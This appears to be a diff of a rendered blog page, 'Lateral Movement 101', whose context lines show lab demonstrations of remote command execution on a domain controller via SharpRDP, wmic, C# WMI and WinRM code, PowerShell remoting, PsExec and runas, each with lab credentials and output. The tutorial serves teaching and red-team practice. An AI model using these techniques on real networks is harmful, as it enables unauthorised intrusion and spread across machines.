@@ -3,7 +3,7 @@
   <head>
     <title>Lateral Movement 101 - Offensive Defence</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
@@ -20,8 +20,8 @@ The most common lateral movement techniques are performed via legitimate managem
 The most common lateral movement techniques are performed via legitimate management channels including Remote Desktop (RDP), Windows Remote Management (WinRM) and Windows Management Instrumentation (WMI). Platforms such as Windows Server Update Services (WSUS) and System Center Configuration Manager (SCCM) can also be abused." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://offensivedefence.co.uk/posts/lateral-movement-101/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-10-12T09:25:13&#43;01:00" />
-<meta property="article:modified_time" content="2021-10-12T09:25:13&#43;01:00" />
+<meta property="article:published_time" content="2021-10-12T09:25:13+01:00" />
+<meta property="article:modified_time" content="2021-10-12T09:25:13+01:00" />
 
 
 
@@ -68,7 +68,7 @@ The most common lateral movement techniques are performed via legitimate managem
 <h2 id="remote-desktop">Remote Desktop</h2>
 <p>I think everyone has probably used RDP before.  It allows you to get a full GUI experience of a remote machine as if you were sat at it, optionally supporting clipboard sharing and remote drive mapping.  Attackers often operate via CLI driven tooling (e.g. Metasploit) and sometimes over high-latency connections.  For that reason, interacting with a remote target via a GUI is not always feasible (or enjoyable) which leads to a general preference for CLI attack tools.</p>
 <p><a href="https://github.com/0xthirteen/SharpRDP">SharpRDP</a> utilises the terminal services library to provide GUI-less authentication and interaction (by sending virtual keystrokes into the &ldquo;Run&rdquo; (Win+R) dialogue).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt; Test-NetConnection -ComputerName dc -Port 3389
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt; Test-NetConnection -ComputerName dc -Port 3389
 
 ComputerName     : dc
 RemoteAddress    : 10.10.120.1
@@ -83,11 +83,11 @@ PS C:\&gt; .\SharpRDP.exe computername=dc command=calc username=LAB\Administrato
 [+] Executing calc
 [+] Disconnecting from    :  dc.lab.local
 [+] Connection closed     :  dc.lab.local
-</code></pre></div><p><br /></p>
+</code></pre></div><br />
 <h2 id="windows-management-instrumentation">Windows Management Instrumentation</h2>
 <p>WMI is Microsoft&rsquo;s implementation of Web-Based Enterprise Management (WBEM), which is an industry standard for accessing management information of local or remote computers.  Applications that leverage WMI can get data or perform operations on said computers.</p>
 <p>Windows comes with a native <code>wmic</code> utility that can be used to execute commands on a target.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;wmic /NODE:dc.lab.local /USER:Administrator /PASSWORD:Passw0rd! process call create calc
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;wmic /NODE:dc.lab.local /USER:Administrator /PASSWORD:Passw0rd! process call create calc
 Executing (Win32_Process)-&gt;Create()
 Method execution successful.
 Out Parameters:
@@ -97,7 +97,7 @@ instance of __PARAMETERS
         ReturnValue = 0;
 };
 </code></pre></div><p>C# has a namespace called <code>System.Management</code> which can be used to perform the same.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
 {
     <span style="color:#66d9ef">var</span> target = args[<span style="color:#ae81ff">0</span>];
     <span style="color:#66d9ef">var</span> username = args[<span style="color:#ae81ff">1</span>];
@@ -123,13 +123,13 @@ instance of __PARAMETERS
     Console.WriteLine(<span style="color:#e6db74">&#34;Process ID  : {0}&#34;</span>, result[<span style="color:#e6db74">&#34;ProcessID&#34;</span>]);
     }
 }
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;WmiDemo.exe dc.lab.local Administrator Passw0rd! calc
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;WmiDemo.exe dc.lab.local Administrator Passw0rd! calc
 Return Value: 0
 Process ID  : 6304
-</code></pre></div><p><br /></p>
+</code></pre></div><br />
 <h2 id="windows-remote-management">Windows Remote Management</h2>
 <p>PowerShell can be used to interact with a host via WinRM.  <code>Enter-PSSession</code> creates a PowerShell session on the target and gives you an interactive command prompt.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; $username = <span style="color:#e6db74">&#34;LAB\Administrator&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; $username = <span style="color:#e6db74">&#34;LAB\Administrator&#34;</span>
 PS C:\&gt; $password = ConvertTo-SecureString <span style="color:#e6db74">&#34;Passw0rd!&#34;</span> -AsPlainText -Force
 PS C:\&gt; $cred = New-Object System.Management.Automation.PSCredential($username, $password)
 PS C:\&gt; Enter-PSSession -ComputerName dc.lab.local -Credential $cred
@@ -138,11 +138,11 @@ dc
 <span style="color:#66d9ef">[dc.lab.local]</span><span style="color:#960050;background-color:#1e0010">:</span> PS C:\Users\Administrator\Documents&gt; whoami
 lab\administrator
 </code></pre></div><p>If you don&rsquo;t have an interactive prompt, <code>Invoke-Command</code> with <code>-ScriptBlock</code> can be used instead.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; Invoke-Command -ComputerName dc.lab.local -Credential $cred -ScriptBlock { hostname; whoami }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; Invoke-Command -ComputerName dc.lab.local -Credential $cred -ScriptBlock { hostname; whoami }
 dc
 lab\administrator
 </code></pre></div><p>C# tooling requires a reference to <code>System.Management.Automation.dll</code> which is available from the PowerShell SDK.  Or if you&rsquo;re lazy like me, grab a copy from Lee Christenden&rsquo;s <a href="https://github.com/leechristensen/UnmanagedPowerShell/blob/master/PowerShellRunner/System.Management.Automation.dll">UnmanagedPowerShell</a> project.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
 {
     <span style="color:#66d9ef">var</span> target = args[<span style="color:#ae81ff">0</span>];
     <span style="color:#66d9ef">var</span> username = args[<span style="color:#ae81ff">1</span>];
@@ -171,13 +171,13 @@ lab\administrator
             
     Console.WriteLine(output);
 }
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;WinRMDemo.exe dc.lab.local LAB\Administrator Passw0rd! &#34;hostname; whoami&#34;
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;WinRMDemo.exe dc.lab.local LAB\Administrator Passw0rd! &#34;hostname; whoami&#34;
 dc
 lab\administrator
-</code></pre></div><p><br /></p>
+</code></pre></div><br />
 <h2 id="psexec">PsExec</h2>
 <p>PsExec is the name of a tool from <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">Sysinternals</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;PsExec64.exe \\dc.lab.local -u LAB\Administrator -p Passw0rd! -i cmd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;PsExec64.exe \\dc.lab.local -u LAB\Administrator -p Passw0rd! -i cmd
 
 PsExec v2.34 - Execute processes remotely
 Copyright (C) 2001-2021 Mark Russinovich
@@ -191,7 +191,7 @@ dc
 rto2\administrator
 </code></pre></div><p>This works by copying <code>PSEXESVC.exe</code> to the target, then creating a new service to execute it.  This binary in turn spawns the specified process (cmd in this case), attaches to its standard in/out and sends data back and forth over named pipes.  To clean up, the service is then removed and <code>PSEXESVC.exe</code> deleted.</p>
 <p>Interacting with the SCM is easy to replicate using the native <code>sc.exe</code> utility or in code.  The backend API <code>OpenSCManager</code> does not accept credentials, so all calls must occur within an authenticated session.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;runas /netonly /user:LAB\Administrator cmd.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;runas /netonly /user:LAB\Administrator cmd.exe
 Enter the password for LAB\Administrator:
 Attempting to start cmd.exe as user &#34;LAB\Administrator&#34; ...
 
